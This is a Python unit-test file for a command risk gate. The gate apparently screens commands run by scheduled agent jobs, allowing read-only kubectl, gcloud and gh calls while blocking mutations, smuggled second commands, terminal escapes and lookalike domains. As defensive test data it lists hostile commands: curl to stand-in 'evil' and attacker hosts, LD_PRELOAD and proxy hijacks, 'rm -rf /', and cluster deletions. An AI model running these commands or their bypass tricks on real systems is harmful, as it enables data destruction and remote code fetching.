"""Unit tests for cron_risk_gate.py (THREAT-002)."""

from __future__ import annotations

import unittest

from cron_risk_gate import (
    cron_command_policy_block,
    cron_content_block,
    cron_execute_code_block,
    find_lookalike_domain,
)


class CronRiskGateTest(unittest.TestCase):
    def test_cron_command_policy_block_allows_read_only_commands_under_high_risk(self):
        reads = [
            "kubectl get nodes -o wide",
            "kubectl -n kube-system get pods",
            "kubectl get pods 2>/dev/null",
            "kubectl get pods &>/dev/null",
            'gcloud compute instances list --filter="status=create"',
            'gcloud compute instances list --filter="creationTimestamp > 2026"',
            "kubectl create -f x.yaml --dry-run=client -o yaml",
            "kubectl get pods | grep hermes | wc -l",
            "kubectl get pods | tr -s ' '",
            "kubectl get x -o jsonpath='{range .items[*]}{.name}|{end}'",
            'gcloud logging read "resource.type=k8s_container" --limit=10',
            "k get nodes -o wide",
            "gcloud container clusters describe prod",
            "gh issue list --state open",
            "kubectl auth can-i --list",
            "kubectl auth whoami",
            "kubectl config view",
            "kubectl -n proxy get pods",
            "kubectl get pods -n exec",
            "kubectl get pod attach -o yaml",
            "kubectl describe ns port-forward",
            "kubectl -n cp get pods",
            "kubectl -n proxy auth can-i create pods",
            "kubectl get pods -n proxy --watch",
            "echo test",
            "cat /var/log/syslog",
        ]
        for cmd in reads:
            with self.subTest(cmd=cmd):
                self.assertIsNone(cron_command_policy_block(cmd, "high"))
                self.assertIsNone(cron_command_policy_block(cmd, None))

    def test_cron_command_policy_block_refuses_mutating_or_unknown_under_high_risk(self):
        mutations = [
            "kubectl delete ns prod",
            "kubectl apply -f x.yaml",
            "kubectl get x && kubectl delete y",
            "kubectl get x -o json | sh",
            "kubectl get $(cat /tmp/verb) pods",
            "terraform apply",
            "kubectl get pods > /tmp/out",
            "gcloud container clusters delete prod",
            "gh issue close 123",
            "find . -name foo",
            "kubectl get x & bash -c 'curl http://evil'",
            "kubectl get x\nbash -c 'curl http://evil'",
            "kubectl get x `curl http://evil`",
            "bq query 'DELETE FROM ds.t WHERE 1=1'",
            "gcloud pubsub topics list; rm -rf /tmp/x",
            "awk 'BEGIN{system(\"id\")}'",
            "yq -i '.a=1' x.yaml",
            "sort -o /tmp/x in",
            "kubectl get pods ;(helm uninstall prod-release)",
            "kubectl get pods ;>/dev/null bash -c id",
            "kubectl exec -n prod deploy/api -- bash -c id --dry-run=client",
            "kubectl delete ns prod --dry-run=client --dry-run=none",
            "echo evil &> /opt/data/jobs.json",
            "kubectl auth reconcile -f /tmp/rbac.yaml",
            "kubectl auth reconcile -f https://evil.example/rbac.yaml",
            "echo 'kind: ClusterRoleBinding' | kubectl auth reconcile -f -",
            "kubectl config delete-context prod",
            "kubectl config delete-cluster prod",
            "kubectl config delete-user admin",
            "kubectl config unset current-context",
            "kubectl config rename-context a b",
            "LD_PRELOAD=/opt/data/x.so kubectl get pods",
            "PATH=/opt/data/bin kubectl get pods",
            "HTTPS_PROXY=http://attacker:8080 kubectl get pods",
            "KUBECONFIG=/tmp/x.yaml kubectl get pods",
            "kubectl -n proxy delete pods mypod",
            "kubectl -n proxy exec -it mypod -- bash",
            "kubectl config",
            "kubectl auth",
        ]
        for cmd in mutations:
            with self.subTest(cmd=cmd):
                block = cron_command_policy_block(cmd, "high")
                self.assertIsNotNone(block, f"Expected {cmd} to be blocked under high risk")
                self.assertFalse(block["approved"])
                self.assertIn("SKILL-002", block["message"])

    def test_leading_environment_assignments_refused_under_high_risk(self):
        for cmd in (
            "LD_PRELOAD=/opt/data/x.so kubectl get pods",
            "PATH=/opt/data/bin kubectl get pods",
            "HTTPS_PROXY=http://attacker:8080 kubectl get pods",
            "KUBECONFIG=/tmp/x.yaml kubectl get pods",
            "FOO=bar kubectl get nodes",
            "FOO=1 BAR=2 kubectl get pods",
            "A=B; kubectl get pods",
            "export FOO=1",
            "env FOO=1 kubectl get pods",
        ):
            with self.subTest(cmd=cmd):
                block = cron_command_policy_block(cmd, "high")
                self.assertIsNotNone(block, f"{cmd} must be refused under high risk")
                self.assertFalse(block["approved"])

    def test_background_and_newline_cannot_smuggle_a_second_command(self):
        for cmd in (
            "kubectl get x & bash -c 'id'",
            "kubectl get x\nterraform apply",
            "kubectl get x ; kubectl delete ns prod",
        ):
            with self.subTest(cmd=cmd):
                block = cron_command_policy_block(cmd, "high")
                self.assertIsNotNone(block, f"{cmd} must be refused")
                self.assertFalse(block["approved"])

    def test_operators_inside_quotes_do_not_split_a_read(self):
        for cmd in (
            "kubectl get pods | grep -E 'a|b'",
            "kubectl get x -o jsonpath='{range .items[*]}{.name}|{end}'",
            'gcloud compute instances list --filter="a=1 ; b=2"',
            'gcloud compute instances list --filter="creationTimestamp > 2026"',
        ):
            with self.subTest(cmd=cmd):
                self.assertIsNone(cron_command_policy_block(cmd, "high"))

    def test_unsafe_tools_rejected_under_high_risk(self):
        for cmd in (
            "awk 'BEGIN{system(\"id\")}'",
            "gawk '{print $1}' file",
            "yq -i '.a=1' x.yaml",
            "sort -o /tmp/x in",
        ):
            with self.subTest(cmd=cmd):
                block = cron_command_policy_block(cmd, "high")
                self.assertIsNotNone(block, f"{cmd} must be refused under high risk")
                self.assertFalse(block["approved"])

    def test_mixed_punctuation_runs_cannot_evade_break(self):
        for cmd in (
            "kubectl get pods ;(helm uninstall prod-release)",
            "kubectl get pods ;>/dev/null bash -c id",
            "kubectl get pods |(rm -rf /)",
        ):
            with self.subTest(cmd=cmd):
                block = cron_command_policy_block(cmd, "high")
                self.assertIsNotNone(block, f"{cmd} must be refused under high risk")
                self.assertFalse(block["approved"])

    def test_dry_run_flag_validation(self):
        self.assertIsNone(cron_command_policy_block("kubectl create -f x.yaml --dry-run=client -o yaml", "high"))
        self.assertIsNone(cron_command_policy_block("kubectl delete pod test --dry-run=server", "high"))

        block = cron_command_policy_block("kubectl exec -n prod deploy/api -- bash -c id --dry-run=client", "high")
        self.assertIsNotNone(block)
        self.assertFalse(block["approved"])

        for verb in ("exec", "cp", "attach", "port-forward", "proxy"):
            with self.subTest(verb=verb):
                block = cron_command_policy_block(f"kubectl {verb} foo --dry-run=client", "high")
                self.assertIsNotNone(block)
                self.assertFalse(block["approved"])

        block = cron_command_policy_block("kubectl delete ns prod --dry-run=client --dry-run=none", "high")
        self.assertIsNotNone(block)
        self.assertFalse(block["approved"])

        # Smuggled --dry-run as a flag value to a value-taking flag must NOT approve mutations
        for flag in ("--cache-dir", "-n", "--context", "--user", "--request-timeout"):
            with self.subTest(flag=flag):
                block = cron_command_policy_block(f"kubectl delete ns prod {flag} --dry-run=client", "high")
                self.assertIsNotNone(block, f"Flag value after {flag} must not satisfy dry-run allowance")
                self.assertFalse(block["approved"])

        # Legitimate dry-run flags alongside value-taking flags must still be approved
        self.assertIsNone(cron_command_policy_block("kubectl delete ns prod --cache-dir /tmp --dry-run=client", "high"))
        self.assertIsNone(cron_command_policy_block("kubectl delete ns prod -n default --dry-run=client", "high"))
        self.assertIsNone(cron_command_policy_block("kubectl delete ns prod --dry-run=client -n default", "high"))

    def test_kubectl_global_flag_verb_shift_refused(self):
        # Global flags with values or ambiguous flags shifting verb positions must be refused
        for cmd in (
            "kubectl --profile-output get delete ns prod",
            "kubectl --profile-output get patch deploy x -p {}",
            "kubectl get delete ns prod",
            "oc --profile-output get delete project prod",
            "kubectl --some-unknown-flag get delete ns prod",
            "kubectl --profile get delete ns prod",
        ):
            with self.subTest(cmd=cmd):
                block = cron_command_policy_block(cmd, "high")
                self.assertIsNotNone(block, f"{cmd} must be refused under high risk")
                self.assertFalse(block["approved"])

        # Legitimate read commands with global flags must be approved
        for cmd in (
            "kubectl --profile-output /tmp/prof get pods",
            "kubectl --profile-output=/tmp/prof get pods",
            "oc --profile-output /tmp/prof get pods",
            "kubectl --all-namespaces get pods",
            "kubectl -A get pods",
        ):
            with self.subTest(cmd=cmd):
                self.assertIsNone(cron_command_policy_block(cmd, "high"), f"{cmd} should be approved")

    def test_non_kubectl_tool_verb_anchoring_and_case_folding(self):
        # Flag values and unpositioned read verbs must not whitelist mutations
        for cmd in (
            "gh api --method DELETE repos/OWNER/REPO/issues/comments/123 -q view",
            "gh api --method PUT repos/O/R/collaborators/attacker -f permission=admin -q view",
            "gh api repos/OWNER/REPO/issues",
            "gh pr close 123",
            "gh issue close 123",
            "bq --format show query 'DELETE FROM ds.t WHERE true'",
            'bq --format show query "DELETE FROM ds.t WHERE true"',
            "bq query 'DELETE FROM ds.t WHERE true'",
            "helm uninstall my-release",
            "helm uninstall list",
            "helm --post-renderer list uninstall my-release",
            "gsutil rm gs://bucket/obj",
            "gsutil cp gs://bucket/obj /tmp/",
            "gcloud compute instances delete prod",
            "gcloud compute instances DELETE prod",
            'gcloud compute instances delete foo --filter="status=list"',
        ):
            with self.subTest(cmd=cmd):
                block = cron_command_policy_block(cmd, "high")
                self.assertIsNotNone(block, f"{cmd} must be refused under high risk")
                self.assertFalse(block["approved"])

        # Legitimate reads for each tool must be approved
        for cmd in (
            "gh pr view 123",
            "gh issue list --state open",
            "gh search issues bug",
            "bq show ds.t",
            "bq ls",
            "helm list",
            "helm get values my-release",
            "gsutil ls gs://bucket",
            "gsutil stat gs://bucket/obj",
            "gcloud compute instances list",
            "gcloud container clusters describe prod",
        ):
            with self.subTest(cmd=cmd):
                self.assertIsNone(cron_command_policy_block(cmd, "high"), f"{cmd} should be approved")

    def test_redirection_validation(self):
        self.assertIsNone(cron_command_policy_block("kubectl get pods >/dev/null", "high"))
        self.assertIsNone(cron_command_policy_block("kubectl get pods 2>/dev/null", "high"))
        self.assertIsNone(cron_command_policy_block("kubectl get pods &>/dev/null", "high"))
        self.assertIsNone(cron_command_policy_block("kubectl get pods >&2", "high"))
        self.assertIsNone(cron_command_policy_block("kubectl get pods 2>&1", "high"))

        for cmd in (
            "kubectl get pods > /tmp/output.txt",
            "echo evil &> /opt/data/jobs.json",
            "kubectl get pods 2> errors.txt",
        ):
            with self.subTest(cmd=cmd):
                block = cron_command_policy_block(cmd, "high")
                self.assertIsNotNone(block)
                self.assertFalse(block["approved"])

    def test_cron_command_policy_block_allows_mutating_commands_under_low_risk(self):
        self.assertIsNone(cron_command_policy_block("kubectl apply -f x.yaml", "low"))
        self.assertIsNone(cron_command_policy_block("kubectl delete ns prod", "low"))

    def test_cron_execute_code_block_refuses_unconditionally(self):
        block = cron_execute_code_block()
        self.assertIsNotNone(block)
        self.assertFalse(block["approved"])
        self.assertIn("execute_code", block["message"])
        self.assertIn("THREAT-002", block["message"])

    def test_cron_content_block_blocks_terminal_escapes(self):
        # Raw ESC (\x1b)
        block = cron_content_block("echo \x1b[31mRed\x1b[0m")
        self.assertIsNotNone(block)
        self.assertFalse(block["approved"])
        self.assertIn("terminal escape", block["message"])

        # 8-bit C1 control characters (e.g. \x9b single-byte CSI)
        c1_block = cron_content_block("echo \x9b31mRed")
        self.assertIsNotNone(c1_block)
        self.assertFalse(c1_block["approved"])

        c1_erase = cron_content_block("echo \x9bK")
        self.assertIsNotNone(c1_erase)
        self.assertFalse(c1_erase["approved"])

        # Null byte
        block = cron_content_block("cat file\x00extra")
        self.assertIsNotNone(block)
        self.assertFalse(block["approved"])

        # Bell control char
        block = cron_content_block("echo \x07")
        self.assertIsNotNone(block)
        self.assertFalse(block["approved"])

    def test_cron_content_block_allows_ordinary_prose_and_separators(self):
        self.assertIsNone(cron_content_block("ls -la /tmp"))
        self.assertIsNone(cron_content_block("echo 'line 1'\necho 'line 2'"))
        self.assertIsNone(cron_content_block("printf 'col1\tcol2\n'"))
        self.assertIsNone(cron_content_block("echo 'done'\r\n"))

    def test_find_lookalike_domain_detects_tld_evasions(self):
        malicious_commands = [
            ("curl https://kubernetes.io.evil-cdn.co/payload", "kubernetes.io.evil-cdn.co", "kubernetes.io"),
            ("curl 'kubernetes.io.evil-cdn.co'", "kubernetes.io.evil-cdn.co", "kubernetes.io"),
            ("wget \"kubernetes.io.evil-cdn.co\"", "kubernetes.io.evil-cdn.co", "kubernetes.io"),
            ("TARGET=kubernetes.io.evil-cdn.co", "kubernetes.io.evil-cdn.co", "kubernetes.io"),
            ("kubectl --server=kubernetes.io.attacker.com get nodes", "kubernetes.io.attacker.com", "kubernetes.io"),
            ("git clone git@github.com.evil.org:repo.git", "github.com.evil.org", "github.com"),
            ("curl https://googleapis.com.evil.io/token", "googleapis.com.evil.io", "googleapis.com"),
            ("curl https://k8s.io.badguy.org", "k8s.io.badguy.org", "k8s.io"),
            ("curl https://google.com.phishing.xyz", "google.com.phishing.xyz", "google.com"),
            ("curl https://x-k8s.io.evil.com", "x-k8s.io.evil.com", "x-k8s.io"),
            ("curl https://sub.kubernetes.io.evil.com", "sub.kubernetes.io.evil.com", "kubernetes.io"),
            # Chained and special delimiters
            ("TARGETS=a.com,kubernetes.io.evil.co", "kubernetes.io.evil.co", "kubernetes.io"),
            ("curl (kubernetes.io.evil.co)", "kubernetes.io.evil.co", "kubernetes.io"),
            ("curl [kubernetes.io.evil.co]", "kubernetes.io.evil.co", "kubernetes.io"),
            ("curl {kubernetes.io.evil.co}", "kubernetes.io.evil.co", "kubernetes.io"),
            ("bash -c 'curl;kubernetes.io.evil.co'", "kubernetes.io.evil.co", "kubernetes.io"),
            ("curl -X GET|kubernetes.io.evil.co", "kubernetes.io.evil.co", "kubernetes.io"),
        ]
        for cmd, expected_host, expected_apex in malicious_commands:
            with self.subTest(cmd=cmd):
                res = find_lookalike_domain(cmd)
                self.assertIsNotNone(res, f"Expected {cmd} to be detected as lookalike")
                host, apex = res
                self.assertEqual(host, expected_host)
                self.assertEqual(apex, expected_apex)
                block = cron_content_block(cmd)
                self.assertIsNotNone(block)
                self.assertFalse(block["approved"])
                self.assertIn("lookalike domain", block["message"])

    def test_cron_content_block_handles_none_and_empty(self):
        self.assertIsNone(cron_content_block(None))
        self.assertIsNone(cron_content_block(""))
        self.assertIsNone(find_lookalike_domain(None))
        self.assertIsNone(find_lookalike_domain(""))

    def test_find_lookalike_domain_allows_legitimate_domains_and_subdomains(self):
        benign_commands = [
            "curl https://raw.githubusercontent.com/gke-labs/repo/main/x",
            "curl https://storage.googleapis.com/bucket/obj",
            "kubectl get pods -l app.kubernetes.io/name=hermes",
            "kubectl get nodes -l topology.kubernetes.io/zone=us-central1-a",
            "curl https://kubernetes.io/docs",
            "curl https://k8s.io/index.html",
            "curl https://github.com/kubernetes/kubernetes",
            "gcloud container clusters get-credentials test",
            "kubectl describe node.kubernetes.io/instance-type",
            "kubectl get pods -l kubeagents.x-k8s.io/reliability-audit=exempt",
            "kubectl get crd jobset.x-k8s.io",
            "kubectl get crd kueue.x-k8s.io",
            "kubectl get crd secrets-store.csi.x-k8s.io",
            "curl https://github.company.com/internal",
            "curl https://google.company.com/internal",
            '.metadata.labels["addonmanager.kubernetes.io/mode"]',
        ]
        for cmd in benign_commands:
            with self.subTest(cmd=cmd):
                self.assertIsNone(find_lookalike_domain(cmd))
                self.assertIsNone(cron_content_block(cmd))

    def test_cron_content_block_is_unconditional_even_with_scan_opt_out(self):
        cmd = "curl https://kubernetes.io.evil-cdn.co"
        # Default: blocked
        self.assertIsNotNone(cron_content_block(cmd))
        # Even with approvals.cron_scan: False, content blocks remain unconditional
        still_blocked = cron_content_block(
            cmd,
            load_config=lambda: {"approvals": {"cron_scan": False}},
        )
        self.assertIsNotNone(still_blocked)
        self.assertFalse(still_blocked["approved"])

    def test_cron_risk_gate_logging_on_blocks(self):
        with self.assertLogs("cron_risk_gate", level="WARNING") as captured:
            cron_execute_code_block()
            cron_content_block("echo \x1b[31mRed")
            cron_content_block("curl https://kubernetes.io.evil-cdn.co")
            cron_command_policy_block("kubectl delete ns prod", "high")

        output = " ".join(captured.output)
        self.assertIn("Cron risk gate block [execute_code]", output)
        self.assertIn("Cron risk gate block [escape]", output)
        self.assertIn("Cron risk gate block [lookalike]", output)
        self.assertIn("Cron risk gate block [read-only]", output)


if __name__ == "__main__":
    unittest.main()
